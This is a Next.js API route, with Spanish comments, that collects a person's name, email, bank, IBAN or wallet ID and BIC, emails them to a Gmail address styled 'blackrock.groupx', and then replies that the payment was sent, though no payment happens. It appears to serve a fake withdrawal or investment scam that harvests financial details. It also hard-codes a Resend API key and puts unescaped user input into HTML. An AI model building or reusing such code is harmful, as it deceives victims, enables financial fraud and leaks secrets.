import { NextApiRequest, NextApiResponse } from 'next';
import { Resend } from 'resend';

// Configuración de Resend con tu clave API
const resend = new Resend('re_4SRzzvTb_KL8BKevatpyJaUQap5BCjdSx');

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const {
      amount,
      paymentAmount,
      bank,
      email,
      iban,
      bic,
      firstName,
      lastName,
      message,
    } = req.body;

    if (!email || !amount || !bank || !message) {
      return res.status(400).json({ error: '❌ Datos incompletos. Verifica los campos.' });
    }

    const result = await resend.emails.send({
      from: 'onboarding@resend.dev', // obligatorio en modo sandbox
      to: 'blackrock.groupx@gmail.com', // tu correo verificado para pruebas
      subject: '💸 Confirmación de Retiro',
      html: `
        <div style="font-family:Arial,sans-serif;font-size:14px">
          <h2>✅ Solicitud de retiro procesada</h2>
          <p><strong>Moneda:</strong> ${amount}</p>
          <p><strong>Banco:</strong> ${bank}</p>
          <p><strong>Cantidad:</strong> ${paymentAmount}</p>
          <p><strong>Nombre y Apellido:</strong> ${firstName} ${lastName}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>IBAN - ID Wallet:</strong> ${iban}</p>
          <p><strong>BIC - Red Wallet:</strong> ${bic}</p>
          <hr />
          <p><strong>📨 Mensaje:</strong> ${message}</p>
        </div>
      `,
    });

    console.log('✅ Enviado con éxito:', result);
    return res.status(200).json({ message: '✅ PAGO ENVIADO CORRECTAMENTE' });
  } catch (error: any) {
    console.error('❌ Error al enviar el correo:', error?.message || error);
    return res.status(500).json({
      error: `❌ Error al enviar el correo: ${error?.message || 'Error desconocido.'}`,
    });
  }
}

